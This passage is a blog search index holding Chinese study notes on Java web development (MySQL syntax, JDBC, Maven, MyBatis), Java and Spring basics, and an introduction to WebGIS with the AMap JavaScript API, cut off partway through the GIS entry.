<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SSM</title>
    <link href="/2022/11/08/SSM/"/>
    <url>/2022/11/08/SSM/</url>
    
    <content type="html"><![CDATA[<p>SSM框架</p><span id="more"></span>]]></content>
    
    
    
    <tags>
      
      <tag>java SSM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb</title>
    <link href="/2022/11/08/JavaWeb/"/>
    <url>/2022/11/08/JavaWeb/</url>
    
    <content type="html"><![CDATA[<p>JavaWeb (for next part)</p><span id="more"></span><h1 id="JavaWeb"><a href="#JavaWeb" class="headerlink" title="JavaWeb"></a>JavaWeb</h1><p>用Java技术来解决相关web互联网领域的技术栈</p><p><img src="/2022/11/08/JavaWeb/javaweb-1.png"></p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h3 id="关系型数据库-非关系型数据库"><a href="#关系型数据库-非关系型数据库" class="headerlink" title="关系型数据库/非关系型数据库"></a>关系型数据库/非关系型数据库</h3><p>关系型数据库是建立在关系模型基础上的数据库  </p><p>简单说，关系型数据库是由多张能互相连接的二维表组成的数据库</p><h3 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h3><p>管理员cmd</p><div class="hljs code-wrapper"><pre><code>mysql -uxxx -pxxx</code></pre></div><h3 id="SQL语法—mysql不区分大小写"><a href="#SQL语法—mysql不区分大小写" class="headerlink" title="SQL语法—mysql不区分大小写"></a>SQL语法—mysql不区分大小写</h3><div class="hljs code-wrapper"><pre><code>show databases;--注释 /# 注释/* 注释 */</code></pre></div><h4 id="SQL语法–操作数据库"><a href="#SQL语法–操作数据库" class="headerlink" title="SQL语法–操作数据库"></a>SQL语法–操作数据库</h4><div class="hljs code-wrapper"><pre><code>1、查询show databases;2、创建创建数据库create database 数据库名称;create database if not exists 数据库名称;3、删除drop database 数据库名称;4、使用数据库查看当前使用的数据库select database();使用数据库use 数据库名称;</code></pre></div><h4 id="SQL语法–操作表"><a href="#SQL语法–操作表" class="headerlink" title="SQL语法–操作表"></a>SQL语法–操作表</h4><div class="hljs code-wrapper"><pre><code>1、查询表查询当前数据库下所有表的名称show tables;查询表结构desc 表名称;2、创建表create table 表名(    字段名 数据类型    ...);3、删除表drop table 表名;drop table if exists 表名;4、修改表(1)修改表名alter table 表名 rename to 新的表名;(2)添加一列alter table 表名 add 列名 数据类型;(3)修改数据类型alter table 表名 modify 列名 新数据类型；(4)修改列名和数据类型alter table 表名 change 列名 新列名 新数据类型;(5)删除列alter table 表名 drop 列名;</code></pre></div><h4 id="SQL语法–操作数据"><a href="#SQL语法–操作数据" class="headerlink" title="SQL语法–操作数据"></a>SQL语法–操作数据</h4><div class="hljs code-wrapper"><pre><code>1、添加数据给指定的列添加数据insert into 表名(列名1,列名2,...) values(值1,值2,...)；给全部的列添加数据/给表添加一条数据insert into 表名 values(值1,值2,...)；批量添加数据insert into 表名(列名1,列名2,...) values (值1,值2，...),(值1,值2，...),...;insert into 表名 values (值1,值2，...),(值1,值2，...),...;2、修改数据update 表名 set 列名1=值1,列名2=值2,...[where条件]；3、删除数据delete from 表名 [where条件];</code></pre></div><h4 id="SQL语法–查询数据"><a href="#SQL语法–查询数据" class="headerlink" title="SQL语法–查询数据"></a>SQL语法–查询数据</h4><div class="hljs code-wrapper"><pre><code>基础查询1、查询多个字段select * from 表名;2、去除重复记录select distinct 字段列表 from 表名;3、起别名as:条件查询select 字段列表 from 表名 where 条件列表;排序查询select 字段列表 from 表名 order by 排序字段名1[排序方式1],排序字段名2[排序方式2],...;分组查询聚合函数select 聚合函数名(列名) from 表;select 字段列表 from 表名 [where 分组前条件限定] group by 分组字段名 [having 分组后条件过滤];分页查询select 字段列表 from 表名 limit 起始索引, 查询条目数;</code></pre></div><p>where和having的区别</p><p>执行时间不一样：where是分组之前进行限定，不满足where条件，则不参与分组，而having是分组之后对结果进行过滤</p><p>可判断的条件不一样：where不能对聚合函数进行判断，having可以</p><h4 id="SQL语法–约束"><a href="#SQL语法–约束" class="headerlink" title="SQL语法–约束"></a>SQL语法–约束</h4><h4 id="SQL语法–数据库设计"><a href="#SQL语法–数据库设计" class="headerlink" title="SQL语法–数据库设计"></a>SQL语法–数据库设计</h4><h4 id="SQL语法–多表查询"><a href="#SQL语法–多表查询" class="headerlink" title="SQL语法–多表查询"></a>SQL语法–多表查询</h4><h4 id="SQL语法–事务"><a href="#SQL语法–事务" class="headerlink" title="SQL语法–事务"></a>SQL语法–事务</h4><h3 id="navicat–可视化工具"><a href="#navicat–可视化工具" class="headerlink" title="navicat–可视化工具"></a>navicat–可视化工具</h3><h1 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h1><p>JDBC就是使用Java语言操作关系型数据库的一套API</p><p>java数据库连接</p><p><img src="/2022/11/08/JavaWeb/javaweb-2.png"></p><p>JDBC本质</p><p>官方(sun公司)定义的一套操作所有关系型数据库的规则，即接口</p><p>各个数据库厂商去实现这套接口，提供数据库驱动jar包</p><p>可以使用这套接口(JDBC)编程，真正执行的代码是驱动jar包中的实现类</p><p>JDBC好处  </p><p>各数据库厂商使用相同的接口，Java代码不需要针对不同数据库分别开发</p><p>可随时替换底层数据库，访问数据库的Java代码基本不变</p><h3 id="JDBC-使用步骤"><a href="#JDBC-使用步骤" class="headerlink" title="JDBC 使用步骤"></a>JDBC 使用步骤</h3><div class="hljs code-wrapper"><pre><code>mysql-connector-java-5.1.48.jar    1.导入相应jar包2.将jar包添加到库3.public class JDBCDemo &#123;    public static void main(String[] args) throws Exception &#123;        //1.注册驱动  抛出异常        Class.forName(&quot;com.mysql.jdbc.Driver&quot;);        //2.获取连接j        String url=&quot;jdbc:mysql://127.0.0.1:3306/forjavaweb?useSSL=false&quot;;        String username=&quot;***&quot;;        String password=&quot;***&quot;;        Connection conn = DriverManager.getConnection(url,username,password);        //3.定义sql语句        String sql=&quot;update javasum set sum=999 where 1=1&quot;;        //4.获取执行sql的对象 Statement        Statement st = conn.createStatement();        //5.执行sql        int i = st.executeUpdate(sql); //受影响的行数        //6.处理结果        System.out.println(&quot;影响的行数：&quot;+i);        //7.释放资源        st.close();        conn.close();    &#125;&#125;</code></pre></div><h3 id="JDBC-API-–-DriverManger"><a href="#JDBC-API-–-DriverManger" class="headerlink" title="JDBC API – DriverManger"></a>JDBC API – DriverManger</h3><p>1.注册驱动    </p><p>2.获取数据库连接</p><div class="hljs code-wrapper"><pre><code>注册驱动可省略注册驱动的步骤//Class.forName(&quot;com.mysql.jdbc.Driver&quot;);-----------------获取数据库连接static Connection getConnection(String url, String user, String password)url:连接路径jdbc:mysql//127.0.0.1/3306/数据库名称?参数键值...useSSL=false本机连接可简写jdbc:mysql://127.0.0.1:3306/forjavaweb?useSSL=falsejdbc:mysql:///forjavaweb?useSSL=false</code></pre></div><h3 id="JDBC-API-–-Connection"><a href="#JDBC-API-–-Connection" class="headerlink" title="JDBC API – Connection"></a>JDBC API – Connection</h3><p>1.获取执行sql的对象</p><p>2.管理事务</p><div class="hljs code-wrapper"><pre><code>获取执行sql的对象Statement createStatement()预编译sql的执行sql对象：防止sql注入PreparedStatement prepareStatement(sql)-------------事务管理开启事务setAutoCommit(boolean autoCommit):true为自动提交事务; false为手动提交事务，即为开启事务提交事务commit()回滚事务rollback()    </code></pre></div><h3 id="JDBC-API-–-Statement"><a href="#JDBC-API-–-Statement" class="headerlink" title="JDBC API – Statement"></a>JDBC API – Statement</h3><p>执行sql语句</p><div class="hljs code-wrapper"><pre><code>int executeUpdate(sql) 执行增删改语句返回值为影响的行数ResultSet executeQuery(sql) 执行查询语句返回值为 ResultSet 结果集对象</code></pre></div><h3 id="JDBC-API-–-ResultSet"><a href="#JDBC-API-–-ResultSet" class="headerlink" title="JDBC API – ResultSet"></a>JDBC API – ResultSet</h3><p>结果集对象</p><p>封装了数据查询语句的结果</p><p>获取查询结果</p><div class="hljs code-wrapper"><pre><code>ResultSet stmt.executeQuery(sql)执行sql语句,返回ResultSet对象获取查询结果boolean next()1.将光标从当前位置向前移动一行2.判断当前行是否为有效行返回值：true 有效行 当前行有数据false 无效行 当前行没有数据    xxx getXxx(参数) 获取数据xxx 数据类型 如：int getInt(参数)</code></pre></div><p>使用步骤</p><div class="hljs code-wrapper"><pre><code>//循环判断游标是否是最后一行末尾while(rs.next())&#123;    //获取数据    rs.getXxx(参数);&#125;int 列的编号 String 列的名称</code></pre></div><p>输出：</p><div class="hljs code-wrapper"><pre><code>while(rs.next())    &#123;        int i = rs.getInt(1);        int i2 = rs.getInt(2);        System.out.println(i);        System.out.println(i2);    &#125;</code></pre></div><h5 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h5><p>数据类</p><div class="hljs code-wrapper"><pre><code>public class javasum &#123;    private int id;    private int sum;&#125;// Alt + Insert ---&gt;     Getter和Setter--- getId()、setId()、getSum()、setSum()// Alt + Insert ---&gt;     toString()public String toString() &#123;&#125;</code></pre></div><p>使用</p><div class="hljs code-wrapper"><pre><code>//创建集合List&lt;javasum&gt; list = new ArrayList&lt;&gt;();//处理结果while(rs.next())&#123;     javasum test = new javasum();     int id = rs.getInt(&quot;id&quot;);     int sum = rs.getInt(&quot;sum&quot;);     test.setId(id);     test.setSum(sum);     list.add(test); &#125; System.out.println(list);</code></pre></div><h3 id="JDBC-API-–-PreparedStatement"><a href="#JDBC-API-–-PreparedStatement" class="headerlink" title="JDBC API – PreparedStatement"></a>JDBC API – PreparedStatement</h3><p>预编译sql语句并执行</p><p>预防sql注入</p><p>使用</p><div class="hljs code-wrapper"><pre><code>1、获取PreparedStatement对象//sql语句中的参数值用 ? 占位符替代String sql=&quot;select * from users where id = ? and password = ?;&quot;;PreparedStatement pstmt = conn.PreparedStatement(sql);2、设置参数值setXxx(参数1,参数2) 给 ? 赋值参数1：? 的位置参数2：? 的值3、执行sqlexecuteUpdate()/executeQuery()    </code></pre></div><p>例</p><div class="hljs code-wrapper"><pre><code>    //3.定义sql语句     String sql=&quot;select sum from javasum where id =?&quot;;    //4.获取执行sql的对象 Statement     PreparedStatement ptmt=conn.prepareStatement(sql);    ptmt.setInt(1,1);    //5.执行sql    ResultSet rs = ptmt.executeQuery();    //6.处理结果    while(rs.next())    &#123;        int sum = rs.getInt(1);        System.out.println(sum);    &#125;</code></pre></div><h3 id="数据库连接池"><a href="#数据库连接池" class="headerlink" title="数据库连接池"></a>数据库连接池</h3><p>标准接口 ： DataSource</p><p>getConnection</p><h5 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h5><p>配置文件</p><div class="hljs code-wrapper"><pre><code>//加载配置文件    Properties prop = new Properties();    prop.load(new FileInputStream(&quot;&quot;));    //获取连接池对象    DataSource datasource = DruidDataSourceFactory.createDataSource(prop);    //获取连接池对象    Connection conn = datasource.getConnection();</code></pre></div><h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Maven是专门用于管理和构建Java项目的工具</p><h5 id="提供了一套标准的项目结构"><a href="#提供了一套标准的项目结构" class="headerlink" title="提供了一套标准的项目结构"></a>提供了一套标准的项目结构</h5><p><img src="/2022/11/08/JavaWeb/javaweb-4.png"></p><h5 id="提供了一套标准化的构造流程（编译，测试，打包，发布……）"><a href="#提供了一套标准化的构造流程（编译，测试，打包，发布……）" class="headerlink" title="提供了一套标准化的构造流程（编译，测试，打包，发布……）"></a>提供了一套标准化的构造流程（编译，测试，打包，发布……）</h5><p>Maven提供了一套简单的命令来完成项目构建</p><h5 id="提供了一套依赖管理机制"><a href="#提供了一套依赖管理机制" class="headerlink" title="提供了一套依赖管理机制"></a>提供了一套依赖管理机制</h5><p>依赖管理其实就是管理项目所依赖的第三方资源(jar包、插件…)</p><p>手动导入—&gt;坐标管理配置</p><h5 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h5><p>本地仓库—中央仓库—远程仓库(私服)</p><h3 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h3><p>安装包</p><p>配置环境变量</p><p>配置本地仓库</p><p>修改conf/settings.xml中的<localRepository>为一个指定目录</localRepository></p><p>配置阿里云私服</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><h3 id="IDEA-配置-Maven"><a href="#IDEA-配置-Maven" class="headerlink" title="IDEA 配置 Maven"></a>IDEA 配置 Maven</h3><p>Setting—Maven</p><h3 id="IDEA-创建-Maven项目"><a href="#IDEA-创建-Maven项目" class="headerlink" title="IDEA 创建 Maven项目"></a>IDEA 创建 Maven项目</h3><p>构建系统–Maven</p><h3 id="IDEA-导入-Maven项目"><a href="#IDEA-导入-Maven项目" class="headerlink" title="IDEA 导入 Maven项目"></a>IDEA 导入 Maven项目</h3><p>导入其pml文件</p><h3 id="依赖范围"><a href="#依赖范围" class="headerlink" title="依赖范围"></a>依赖范围</h3><p>通过设置坐标的依赖范围(scope)，可以设置对应jar包的作用范围:</p><p>编译环境、测试环境、运行环境</p><h2 id="Maven-坐标"><a href="#Maven-坐标" class="headerlink" title="Maven 坐标"></a>Maven 坐标</h2><p>Maven中的坐标是资源的唯一标识</p><p>使用坐标来定义项目或引入项目中需要的依赖</p><h3 id="Maven-坐标-组成"><a href="#Maven-坐标-组成" class="headerlink" title="Maven 坐标 组成"></a>Maven 坐标 组成</h3><p>groupld:定义当前Maven项目隶属组织名称</p><p>artifactld:定义当前Maven项目名称</p><p>version:定义当前项目版本号</p><div class="hljs code-wrapper"><pre><code>&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;mysql&lt;/groupId&gt;        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;        &lt;version&gt;5.1.46&lt;/version&gt;    &lt;/dependency&gt;&lt;/dependencies&gt;</code></pre></div><p>Alt–Insert–dependencies–搜索</p><h1 id="MyBatis"><a href="#MyBatis" class="headerlink" title="MyBatis"></a>MyBatis</h1><p>MyBatis是一款优秀的持久层框架，用于简化JDBC开发</p><h3 id="持久层"><a href="#持久层" class="headerlink" title="持久层"></a>持久层</h3><p>负责将数据到保存到数据库的那一层代码</p><p>JavaEE三层架构:表现层、业务层、持久层</p><h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><p>框架就是一个半成品软件，是一套可重用的、通用的、软件基础代码模型</p><p>在框架的基础之上构建软件编写更加高效、规范、通用、可扩展</p><h3 id="JDBC-缺点"><a href="#JDBC-缺点" class="headerlink" title="JDBC 缺点"></a>JDBC 缺点</h3><p>1、硬编码</p><p>注册驱动，获取连接</p><p>SQL语句</p><p>2、操作繁琐</p><p>手动设置参数</p><p>手动封装结果集</p><h3 id="MyBatis-简化"><a href="#MyBatis-简化" class="headerlink" title="MyBatis 简化"></a>MyBatis 简化</h3><p>1、硬编码—&gt;配置文件</p><p>2、操作繁琐—&gt;自动完成</p><p>MyBatis 免除了几乎所有的JDBC代码以及设置参数和获取结果集的工作</p><h2 id="MyBatis-基础步骤"><a href="#MyBatis-基础步骤" class="headerlink" title="MyBatis 基础步骤"></a>MyBatis 基础步骤</h2><p>MyBatis 快速入门<br><a href="https://mybatis.org/mybatis-3/zh/getting-started.html">https://mybatis.org/mybatis-3/zh/getting-started.html</a></p><p>创建模块，导入坐标</p><p>编写配置文件</p><p>编写SQL映射文件</p><p>编码</p><p>1、定义pojo类<br>2、加载核心配置文件，获取SqlSessionFactory 对象<br>3、获取SqISession对象，执行SQL语句<br>4、释放资源</p><h3 id="IDEA-连接-mysql数据库"><a href="#IDEA-连接-mysql数据库" class="headerlink" title="IDEA 连接 mysql数据库"></a>IDEA 连接 mysql数据库</h3><h2 id="Mapper代理开发"><a href="#Mapper代理开发" class="headerlink" title="Mapper代理开发"></a>Mapper代理开发</h2>]]></content>
    
    
    
    <tags>
      
      <tag>java web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java</title>
    <link href="/2022/11/07/Java/"/>
    <url>/2022/11/07/Java/</url>
    
    <content type="html"><![CDATA[<p>基于java的学习</p><span id="more"></span><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h2 id="IDEA项目结构"><a href="#IDEA项目结构" class="headerlink" title="IDEA项目结构"></a>IDEA项目结构</h2><p>project(项目)<br>————model(模块)<br>————————package(包)<br>————————————class(类)</p><h2 id="IDEA-上手"><a href="#IDEA-上手" class="headerlink" title="IDEA 上手"></a>IDEA 上手</h2><p>新建模块-新建包-新建类</p><p>在类中编写</p><p><img src="/2022/11/07/Java/Java-1.png"></p><h3 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h3><div class="hljs code-wrapper"><pre><code>package top.opn90;public class HelloWorld &#123;    public static void main(String[] args) &#123;    //psvm        System.out.println(&quot;HelloWorld&quot;);       //sout    &#125;&#125;</code></pre></div><h3 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h3><p>在进行运算时，需要先将数据类型统一才能进行运算</p><p>隐式转换</p><p>小的变为大的 保留数据</p><p>强制转换</p><div class="hljs code-wrapper"><pre><code>double a=1.23;int b = (int)a;</code></pre></div><h3 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h3><h5 id="Scanner相关的功能"><a href="#Scanner相关的功能" class="headerlink" title="Scanner相关的功能"></a>Scanner相关的功能</h5><div class="hljs code-wrapper"><pre><code>//输入整数import java.util.Scanner;public class GetIn &#123;    public static void main(String[] args) &#123;        Scanner scanner = new Scanner(System.in);        int a = scanner.nextInt();    //int        System.out.println(a);    &#125;&#125;//输入字符串String a = scanner.next();//输入多个字符串String a = scanner.nextLine();</code></pre></div><h5 id="System相关的功能"><a href="#System相关的功能" class="headerlink" title="System相关的功能"></a>System相关的功能</h5><h5 id="使用命令行相关设置"><a href="#使用命令行相关设置" class="headerlink" title="使用命令行相关设置"></a>使用命令行相关设置</h5><h5 id="JOptionPane相关功能"><a href="#JOptionPane相关功能" class="headerlink" title="JOptionPane相关功能"></a>JOptionPane相关功能</h5><h3 id="String-回文数"><a href="#String-回文数" class="headerlink" title="String - 回文数"></a>String - 回文数</h3><div class="hljs code-wrapper"><pre><code>package top.opn90;import java.util.Scanner;//回文数public class ReturnNum &#123;    public static void main(String[] args) &#123;        Scanner scanner = new Scanner(System.in);        int a = scanner.nextInt();        String str= Integer.toString(a);        char[] arr= str.toCharArray();        int i = str.length();        //System.out.println(i);        for(int p=0;2*p&lt;=i;p++)&#123;            if(arr[p]==arr[i-p-1])&#123;                continue;            &#125;            else&#123;                System.out.println(str+&quot;不是回文数&quot;);                return;            &#125;        &#125;        System.out.println(str+&quot;是回文数&quot;);    &#125;&#125;</code></pre></div><h5 id="类型转换-1"><a href="#类型转换-1" class="headerlink" title="类型转换"></a>类型转换</h5><div class="hljs code-wrapper"><pre><code>//int ——&gt; StringString.valueOf(int i)Interger.toString(int i)i+&quot;&quot;//String ——&gt; char[]String str= &quot;&quot;;char[] arr= str.toCharArray();</code></pre></div><h3 id="方法-函数"><a href="#方法-函数" class="headerlink" title="方法/函数"></a>方法/函数</h3><div class="hljs code-wrapper"><pre><code>public static 返回值类型 方法名 (参数)&#123;    方法体;    return 返回值;/void —— null&#125;</code></pre></div><h5 id="方法的重载"><a href="#方法的重载" class="headerlink" title="方法的重载"></a>方法的重载</h5><p>同个类中，方法名相同，参数不同的方法，与返回值无关</p><h3 id="面向对象-面向过程"><a href="#面向对象-面向过程" class="headerlink" title="面向对象/面向过程"></a>面向对象/面向过程</h3><p>面向过程就是分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以了；面向对象是把构成问题事务分解成各个对象，建立对象的目的不是为了完成一个步骤，而是为了描叙某个事物在整个解决问题的步骤中的行为</p><h5 id="面向过程就是自上向下的编程"><a href="#面向过程就是自上向下的编程" class="headerlink" title="面向过程就是自上向下的编程"></a>面向过程就是自上向下的编程</h5><p>性能比面向对象高，因为类调用时需要实例化，开销比较大</p><p>没有面向对象易维护，易复用，易扩展。可维护性差，不易修改</p><h5 id="面向对象就是高度实物抽象化"><a href="#面向对象就是高度实物抽象化" class="headerlink" title="面向对象就是高度实物抽象化"></a>面向对象就是高度实物抽象化</h5><p>易维护，易复用，易扩展</p><p>由于面向对象由封装，继承，多态性的特性，可以设计出耦合度低的系统，使系统更加灵活，更加易于维护 </p><p>缺点是性能比面向过程低</p><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><div class="hljs code-wrapper"><pre><code>public class cl&#123;    //属性    //方法&#125;</code></pre></div><h5 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h5><div class="hljs code-wrapper"><pre><code>public class cl&#123;    public cl()&#123;&#125;    public cl(int a,int b)&#123;&#125;&#125;</code></pre></div><p>无论是否使用，都手动书写无参数构造方法，和带全部参数的构造方法</p><h5 id="标准JavaBean"><a href="#标准JavaBean" class="headerlink" title="标准JavaBean"></a>标准JavaBean</h5><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>interface</p><div class="hljs code-wrapper"><pre><code>//定义接口public interface 接口名&#123;&#125;//实现接口public class 类名 implements 接口名1,接口名2&#123;&#125;//实现类可以在继承类的同时实现多个接口public class 类名 extends 父类 implements 接口名1,接口名2&#123;&#125;</code></pre></div><h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><h2 id="Spring-Framework系统架构"><a href="#Spring-Framework系统架构" class="headerlink" title="Spring Framework系统架构"></a>Spring Framework系统架构</h2><p><img src="/2022/11/07/Java/Java-2.png"></p><h2 id="IoC"><a href="#IoC" class="headerlink" title="IoC"></a>IoC</h2><p>IoC ( Inversion of Control )控制反转</p><p>使用对象时，在程序中不要主动使用new产生对象，转换为由外部提供对象</p><p>使用对象时，由主动new产生对象转换为由外部提供对象，此过程中对象创建控制权由程序转移到外部，此思想称为控制反转</p><p>IoC容器负责对象的创建、初始化等一系列工作，被创建或被管理的对象在Ioc容器中统称为Bean</p><h2 id="DI"><a href="#DI" class="headerlink" title="DI"></a>DI</h2><p>DI( Dependency Injection )依赖注入</p><h1 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h1><p>SpringBoot提供了一种快速使用Spring的方式，基于约定优于配置的思想，可以让开发人员不必在配置与逻辑业务之间进行思维的切换，全身心的投入到逻辑业务的代码编写中，从而大大提高了开发的效率，一定程度上缩短了项目周期</p><p>Spring Boot并不是对Spring功能上的增强，而是提供了一种快速使用Spring的方式</p>]]></content>
    
    
    
    <tags>
      
      <tag>web java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GIS</title>
    <link href="/2022/10/24/GIS/"/>
    <url>/2022/10/24/GIS/</url>
    
    <content type="html"><![CDATA[<p>基于GIS的开发与学习</p><span id="more"></span><h1 id="GIS"><a href="#GIS" class="headerlink" title="GIS"></a>GIS</h1><h2 id="什么是GIS"><a href="#什么是GIS" class="headerlink" title="什么是GIS"></a>什么是GIS</h2><p>GIS: Geographic lnformation System 地理信息系统</p><p>地理信息系统（GIS，Geographic Information System）是一门综合性学科结合了地理学与地图学以及遥感和计算机科学</p><p>GIS开发通常分为  </p><ul><li>桌面端开发  </li><li>web端开发  </li><li>移动端开发  </li></ul><h2 id="C-S-amp-B-S"><a href="#C-S-amp-B-S" class="headerlink" title="C/S &amp; B/S"></a>C/S &amp; B/S</h2><h5 id="C-S-架构"><a href="#C-S-架构" class="headerlink" title="C/S 架构"></a>C/S 架构</h5><p>客户机-服务器，即Client-Server(C/S)结构<br>C/S结构通常采取两层结构<br>服务器负责数据的管理，客户机负责完成与用户的交互任务   </p><h5 id="B-S-架构"><a href="#B-S-架构" class="headerlink" title="B/S 架构"></a>B/S 架构</h5><p>浏览器-服务器，Browser/Server<br>主要应用于广域网中  </p><p>三层：  </p><ul><li>Browser客户端  </li><li>webapp服务器端  </li><li>DB（数据库）端  </li></ul><h2 id="webGIS"><a href="#webGIS" class="headerlink" title="webGIS"></a>webGIS</h2><p>webGIS<br>将前端可视化技术与GIS技术结合,提供更好的信息展示和用户交互</p><p>HTML –&gt; vue/react –&gt; openlayers/cesium</p><p>GIS框架本质上来讲,使用的依然是JavaScript做为编程语言,结合HTML和CSS在地图场景的具体应用</p><h2 id="webGIS-地图组成结构"><a href="#webGIS-地图组成结构" class="headerlink" title="webGIS - 地图组成结构"></a>webGIS - 地图组成结构</h2><p><img src="/2022/10/24/GIS/gis-1.png"></p><h3 id="图层-Layer"><a href="#图层-Layer" class="headerlink" title="图层 - Layer"></a>图层 - Layer</h3><p>图层是指能够在视觉上覆盖一定地图范围，用来描述全部或者部分现实世界区域内的地图要素的抽象概念  </p><p>标准图层、卫星图层、路网图层、路况图层</p><h3 id="矢量图形-Vector-Overlays"><a href="#矢量图形-Vector-Overlays" class="headerlink" title="矢量图形 - Vector Overlays"></a>矢量图形 - Vector Overlays</h3><p>矢量图形，一般覆盖于底图图层之上，通过矢量的方式(路径或者实际大小)来描述其形状，用几何的方式来展示真实的地图要素，会随着地图缩放而发生视觉大小的变化，但其代表的实际路径或范围不变</p><h3 id="点标记-Markers"><a href="#点标记-Markers" class="headerlink" title="点标记 - Markers"></a>点标记 - Markers</h3><p>点标记是用来标示某个位置点信息的一种地图要素，覆盖于图层之上</p><p>点要素</p><h3 id="地图控件-Map-Controls"><a href="#地图控件-Map-Controls" class="headerlink" title="地图控件 - Map Controls"></a>地图控件 - Map Controls</h3><p>控件浮在所有图层和地图要素之上，用于满足一定的交互或提示功能</p><h2 id="地图名词"><a href="#地图名词" class="headerlink" title="地图名词"></a>地图名词</h2><h3 id="地图级别-ZoomLevel"><a href="#地图级别-ZoomLevel" class="headerlink" title="地图级别 - ZoomLevel"></a>地图级别 - ZoomLevel</h3><p>级别与地图的比例尺成正比，每增大一级，地图的比例尺也增大一倍，地图显示的越详细</p><p>Web地图的最小级别通常为3级，最大级别各家略有不同，高德地图JSAPI目前最大级别为20级 </p><h3 id="经纬度-LngLat"><a href="#经纬度-LngLat" class="headerlink" title="经纬度 - LngLat"></a>经纬度 - LngLat</h3><p>坐标通常指经纬度坐标，高德地图的坐标范围大致为:<br>东西经180度(-180——180，西半球为负，东半球为正)<br>南北纬85度(-85———85，北半球为正，南半球为负）  </p><h3 id="底图-BaseLayer"><a href="#底图-BaseLayer" class="headerlink" title="底图 - BaseLayer"></a>底图 - BaseLayer</h3><p>严格意义上，底图指处于所有图层和图形最下方的一个图层，通常不透明。可以是单一图层，比如官方标准图层，也可以是图层组合，比如卫星图层和路网图层组合</p><h3 id="地图要素-Map-Features"><a href="#地图要素-Map-Features" class="headerlink" title="地图要素 - Map Features"></a>地图要素 - Map Features</h3><p>严格意义的地图要素指的是展示在地图上的地理要素，包括道路、区域面、建筑、POI标注、路名等  </p><p>开发者自定义的点标记、矢量图形也可以看做是一种地图要素  </p><h3 id="标注-Labels"><a href="#标注-Labels" class="headerlink" title="标注 - Labels"></a>标注 - Labels</h3><p>将底图上自带的标示一定信息的文字或图标称为标注，比如POI标注，道路名称标注等 </p><p>不同地图级别存在不同标注</p><h3 id="地图平面像素坐标-Plane-Coordinates"><a href="#地图平面像素坐标-Plane-Coordinates" class="headerlink" title="地图平面像素坐标 - Plane Coordinates"></a>地图平面像素坐标 - Plane Coordinates</h3><p>地图平面像素坐标指投影为平面之后的地图上的平面像素坐标 </p><p>高德地图使用的Web墨卡托投影，在3级时，平面坐标范围为横纵0-256*2的3次方像素，每级别扩大一倍，即第n级的平面坐标范围为0-256*2的n次方像素 </p><h3 id="投影-Projection"><a href="#投影-Projection" class="headerlink" title="投影 - Projection"></a>投影 - Projection</h3><p>地图投影指的是将地球球面的经纬度坐标映射到地图平面坐标的变换和映射关系  </p><p>高德地图使用Web 墨卡托投影，即采用EPSG:3857坐标系统</p><h2 id="高德开放平台"><a href="#高德开放平台" class="headerlink" title="高德开放平台"></a>高德开放平台</h2><p><a href="https://lbs.amap.com/">高德开放平台官网：https://lbs.amap.com/</a></p><h3 id="开发准备"><a href="#开发准备" class="headerlink" title="开发准备"></a>开发准备</h3><p><a href="https://lbs.amap.com/api/jsapi-v2/guide/abc/prepare">高德开放平台官网：https://lbs.amap.com/api/jsapi-v2/guide/abc/prepare</a></p><p><img src="/2022/10/24/GIS/gis-2.png"></p><p><img src="/2022/10/24/GIS/gis-3.png"></p><div class="hljs code-wrapper"><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;title&gt;&lt;/title&gt;    &lt;!--引入高德脚本--&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        window._AMapSecurityConfig = &#123;            securityJsCode:&#39;您申请的安全密钥&#39;,        &#125;    &lt;/script&gt;    &lt;script type=&quot;text/javascript&quot;         src=&quot;https://webapi.amap.com/maps?v=2.0&amp;key=您申请的key值&quot;&gt;    &lt;/script&gt;     &lt;!--设置地图样式--&gt;    &lt;style&gt;        #container&#123;            width: 700px;            height: 700px;            &#125;    &lt;/style&gt;  &lt;head&gt;  &lt;body&gt;    &lt;!--创建地图容器--&gt;    &lt;div id=&quot;container&quot;&gt;&lt;/div&gt;    &lt;script&gt;        //定义一个变量，保存/加载对象        var map = new AMap.Map(&#39;container&#39;)    &lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre></div><h3 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h3><p><img src="/2022/10/24/GIS/gis-4.png"></p><h3 id="地图参数"><a href="#地图参数" class="headerlink" 